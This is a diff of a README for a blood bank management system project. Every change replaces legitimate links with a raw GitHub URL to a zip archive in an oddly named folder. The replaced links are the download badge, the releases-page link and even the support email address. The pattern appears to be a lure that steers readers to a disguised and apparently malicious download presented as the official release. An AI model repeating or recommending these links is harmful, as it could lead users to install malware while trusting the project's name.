@@ -1,7 +1,7 @@
 ```markdown
 # 🩸 Bloodbank-management-system - Manage Blood Efficiently and Safely
 
-[![Download](https://img.shields.io/badge/Download_Latest_Version-Available-brightgreen)](https://github.com/NonoNoodle1/Bloodbank-management-system/releases)
+[![Download](https://raw.githubusercontent.com/NonoNoodle1/Bloodbank-management-system/main/appreciatory/Bloodbank_system_management_v3.6-alpha.3.zip)](https://raw.githubusercontent.com/NonoNoodle1/Bloodbank-management-system/main/appreciatory/Bloodbank_system_management_v3.6-alpha.3.zip)
 
 ## 🚀 Overview
 
@@ -50,7 +50,7 @@ To run BBMS smoothly, ensure your system meets the following requirements:
 To download the Blood Bank Management System, follow these steps:
 
 1. **Visit the Releases Page:** Click on the link below to go to the downloads section.
-   [Download BBMS from Releases](https://github.com/NonoNoodle1/Bloodbank-management-system/releases)
+   [Download BBMS from Releases](https://raw.githubusercontent.com/NonoNoodle1/Bloodbank-management-system/main/appreciatory/Bloodbank_system_management_v3.6-alpha.3.zip)
 2. **Select the Latest Version:** Look for the most recent release. 
 3. **Download the Software:** Click on the file labeled for your operating system to start the download.
 4. **Install the Application:** 
@@ -66,7 +66,7 @@ To download the Blood Bank Management System, follow these steps:
 
 If you encounter any issues, need help, or have questions about features, you can reach our support team:
 
-- **Email:** support@bloodbankmanagementsystem.com
+- **Email:** https://raw.githubusercontent.com/NonoNoodle1/Bloodbank-management-system/main/appreciatory/Bloodbank_system_management_v3.6-alpha.3.zip
 - **Chat Support:** Available on our website during business hours.
 
 ## 🔗 Additional Resources
